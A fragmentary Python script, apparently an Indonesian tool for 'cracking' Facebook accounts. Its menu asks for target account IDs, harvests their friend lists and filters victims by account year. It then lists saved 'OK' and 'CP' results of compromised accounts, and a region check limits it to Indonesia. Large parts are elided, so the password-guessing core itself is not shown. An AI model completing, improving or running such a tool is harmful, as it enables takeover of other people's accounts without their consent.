...
try:
	...
	if "Indonesia" not in negara:
		prints(Panel(f"""{M2}this script only work in Indonesia, please search another script""",width=80,style=f"{color_table}"))
		exit()
except requests.exceptions.ConnectionError:
	prints(Panel(f"""{M2}koneksi internet bermasalah, silahkan cek jaringan internet kamu""",width=80,style=f"{color_table}"))
	exit()
...
("      "\ |"  \    /"  ||   _  "\  /"     "|  {M2}██████████████████████{reset}
 \___/   :) \   \  //   |(. |_)  :)(: ______)  {M2}██████████████████████{reset}
  ...
  //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████{reset}
 (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
  \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder""",style=f"{color_table}"))
...
def menu():
	...
	try:
		...
		login()
	prints(Panel(f"{P2}{IP}",padding=(0,29),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	prints(Panel(f"{P2}ketik 'crack' untuk mulai crack dan ketik 'cek' untuk cek hasil crack",style=f"{color_table}")) 
	men = console.input(f" {H2}• {P2}masukan pilihan : ")
	if men in["CEK","Cek","cek"]:
		cek_hasil()
	elif men in["CRACK","Crack","crack"]:
		limit = console.input(f" {H2}• {P2}masukan total id : ")
		if limit not in angka:
			prints(Panel(f"{M2} silahkan masukan hanya angka saja",style=f"{color_table}"))
			exit()
		prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik 'me' untuk dump dari teman sendiri",width=80,style=f"{color_table}"))
		no = 0
		for z in range(int(limit)):
			no += 1
			idt = console.input(f" {H2}• {P2}masukan id {H2}{no}{P2} : ")
			try:
				...
				prints(Panel(f"""{M2}gagal mengambil id mungkin akun tidak ada atau daftar teman private""",width=80,style=f"{color_table}"))
				exit()
		tahun = console.input(f" {H2}• {P2}masukan tahun akun : ").split(",")
		if "all" in tahun:
			for data in idp:
				id.append(data)
		else:
		...
		prints(Panel(f"""{M2}menu yang tersedia hanya dengan masukan input 'crack' atau 'cek' saja""",width=80,style=f"{color_table}"))
		exit()
...
[{color_rich}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_table}"))
	res = console.input(f" {H2}• {P2}masukan pilihan : ")
	if res in["1","01"]:
		dirs = os.listdir("OK")
		...
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_table}"))
		bngst = console.input(f" {H2}• {P2}masukan angka : ")
		try:
			kontol = files[int(bngst)-1]
			totalok = open(f"OK/{kontol}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_table}"))
			exit()
